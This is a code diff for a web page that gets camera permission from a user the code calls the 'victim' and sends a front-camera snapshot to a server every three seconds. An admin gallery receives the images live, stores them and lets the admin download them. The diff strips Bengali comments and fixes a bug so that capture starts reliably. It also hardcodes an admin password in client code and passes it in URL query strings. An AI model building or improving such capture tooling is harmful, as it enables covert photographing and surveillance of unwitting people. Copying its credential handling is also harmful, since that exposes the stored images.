@@ -106,7 +106,6 @@
         if (!res.ok) throw new Error('Unauthorized');
         
         const images = await res.json();
-        // স্টোর করা ছবিগুলো গ্রিডের শেষে যুক্ত হবে
         images.forEach(img => {
           const imgUrl = `/api/images/view/${img.filename}?pwd=${adminPassword}`;
           addStream(imgUrl, img.timestamp, img.filename, false);
@@ -134,7 +133,6 @@
       ws.onmessage = (event) => {
         try {
           const data = JSON.parse(event.data);
-          // রিয়েল-টাইম ছবি আসলে সরাসরি শো করবে (পাসওয়ার্ড ছাড়াই)
           if (data.type === 'new_image' && data.image) {
             addStream(data.image, data.timestamp, data.filename, true);
           }
@@ -146,18 +144,27 @@
       ws.onclose = () => reconnectTimer = setTimeout(() => connectSocket(socketMode), 2000);
     }
 
+    // বাগ ফিক্স করা হয়েছে এই ফাংশনে
     startButton.addEventListener('click', async () => {
       if (snapshotTimer) return;
       try {
         startButton.disabled = true;
         victimStatus.textContent = 'Requesting camera permission...';
+        
         videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         video.srcObject = videoStream;
         await video.play();
+        
         victimStatus.textContent = 'Camera sharing is active.';
         startButton.textContent = 'Sharing Active';
         
-        await new Promise((resolve) => video.addEventListener('loadedmetadata', resolve, { once: true }));
+        // ডাইমেনশন লোড হওয়ার জন্য সেফ চেক
+        if (!video.videoWidth || !video.videoHeight) {
+          await new Promise((resolve) => {
+            video.addEventListener('loadedmetadata', resolve, { once: true });
+          });
+        }
+        
         sendSnapshot();
         snapshotTimer = setInterval(sendSnapshot, 3000);
       } catch (error) {
@@ -183,7 +190,6 @@
     });
 
     function addStream(imgSrc, timestamp, filename, isPrepend = true) {
-      // যদি আগে থেকেই এই কার্ড থাকে, তবে নতুন করে আর বানাবে না
       if (document.getElementById(filename)) return;
 
       const card = document.createElement('div');
@@ -191,7 +197,7 @@
       card.id = filename;
 
       const img = document.createElement('img');
-      img.src = imgSrc; // রিয়েল-টাইম হলে base64, হিস্ট্রি হলে /api/images/view...
+      img.src = imgSrc; 
       img.alt = 'Snapshot';
       card.appendChild(img);
 
@@ -206,7 +212,6 @@
       actionDiv.className = 'action-btns';
 
       const downloadBtn = document.createElement('a');
-      // স্টোর হওয়া ছবি হলে API ডাউনলোড লিংক, রিয়েল-টাইম হলে সরাসরি base64 থেকে ডাউনলোড
       downloadBtn.href = imgSrc.startsWith('/api/') ? `/api/images/download/${filename}?pwd=${adminPassword}` : imgSrc;
       downloadBtn.download = filename;
       downloadBtn.textContent = 'Download';
@@ -218,7 +223,6 @@
       deleteBtn.className = 'delete-btn';
       deleteBtn.onclick = async () => {
         let currentPwd = adminPassword;
-        // ডিলিট করার জন্য পাসওয়ার্ড না থাকলে চেয়ে নেবে
         if (!currentPwd) {
           currentPwd = prompt('Enter Admin Password to delete this image:');
           if (!currentPwd) return;
@@ -229,7 +233,7 @@
           if (res.ok) {
             card.remove();
             if (!adminPassword && currentPwd === '74722222') {
-              adminPassword = currentPwd; // একবার সঠিক পাসওয়ার্ড দিলে তা সেভ থাকবে
+              adminPassword = currentPwd; 
             }
           } else {
             alert('Failed to delete! Incorrect Password.');
